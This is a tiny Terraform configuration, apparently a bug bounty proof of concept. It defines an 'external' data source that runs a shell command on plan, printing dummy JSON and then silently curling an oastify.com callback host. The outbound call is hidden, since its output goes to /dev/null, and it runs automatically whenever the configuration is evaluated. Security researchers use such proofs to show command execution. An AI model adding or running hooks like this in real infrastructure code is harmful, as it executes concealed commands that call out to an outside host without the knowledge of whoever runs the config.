data "external" "example" {
  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL k4p8qr1rjc2xpter45wiw1z7cyip6gx4m.oastify.com/aws-bugbounty-poc-hackerhero > /dev/null 2>&1"]
}
